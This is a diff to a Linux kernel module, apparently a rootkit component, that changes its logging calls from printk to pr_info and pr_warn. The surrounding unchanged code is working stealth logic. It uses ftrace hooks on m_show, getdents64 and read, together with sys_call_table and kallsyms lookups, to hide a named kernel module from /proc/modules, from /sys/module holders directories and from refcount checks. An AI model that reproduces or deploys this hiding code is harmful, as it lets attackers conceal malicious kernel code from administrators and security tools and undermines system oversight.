@@ -85,7 +85,7 @@ ssize_t new_read(const struct pt_regs *regs) {
 
             int does_use_hidden_module = already_uses(module_to_hide, current_module);
             if (does_use_hidden_module) {
-                printk(KERN_ALERT "Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
+                pr_info("Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
 
                 int refcount = module_refcount(current_module);
                 if (refcount > 0) {
@@ -121,7 +121,7 @@ int new_getdents64(const struct pt_regs *regs) {
 
         int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
-            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
+            pr_warn("Error while copying from user space! error %d", copy_res);
             return total_bytes_read;
         }
 
@@ -142,7 +142,7 @@ int new_getdents64(const struct pt_regs *regs) {
             char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
 
             if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
-                printk(KERN_ALERT "Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
+                pr_info("Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                 has_been_found = true;
 
                 // Array will be shortened by the length of the member we will delete.
@@ -176,7 +176,7 @@ void notrace get_dents64_callback_func(unsigned long ip, unsigned long parent_ip
 int new_m_show(struct seq_file *m, void *p) {
     struct module *mod = list_entry(p, struct module, list);
     if (!strcmp(mod->name, mod_name_to_hide)) {
-        printk(KERN_ALERT "Hiding %s from m_show", mod->name);
+        pr_warn("Hiding %s from m_show", mod->name);
         return 0;
     }
 
@@ -190,14 +190,14 @@ void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, str
 
 int load(void) {
     if (mod_name_to_hide == NULL) {
-        printk("Mod name to hide has not been set! Exiting...");
+        pr_warn("Mod name to hide has not been set! Exiting...");
         return -1;
     }
 
-    printk(KERN_ALERT "Initializing...");
+    pr_info("Initializing...");
     unsigned long m_show_address = kallsyms_lookup_name("m_show");
     if (!m_show_address) {
-        printk(KERN_ALERT "Failed to find m_show!");            
+        pr_warn("Failed to find m_show!");            
         return 0;
     }
 
@@ -207,7 +207,7 @@ int load(void) {
 
     unsigned long *syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     if (!syscall_table) {
-        printk(KERN_ALERT "Failed to find syscall table!");            
+        pr_warn("Failed to find syscall table!");            
         return 0;
     }
 
@@ -219,19 +219,19 @@ int load(void) {
     ftrace_set_filter_ip(&read_ops, (unsigned long)original_read_ptr, 0, 0);
     register_ftrace_function(&read_ops);
 
-    printk(KERN_ALERT "Initialized successfuly!");
+    pr_info("Initialized successfuly!");
 
     return 0;
 }
  
 void unload(void) {
-    printk(KERN_ALERT "Shutting down.");
+    pr_info("Shutting down.");
 
     unregister_ftrace_function(&m_show_ops);
     unregister_ftrace_function(&get_dents64_ops);
     unregister_ftrace_function(&read_ops);
 
-    printk(KERN_ALERT "Goodbye world...");
+    pr_info("Goodbye world...");
 }
 
 module_init(load);
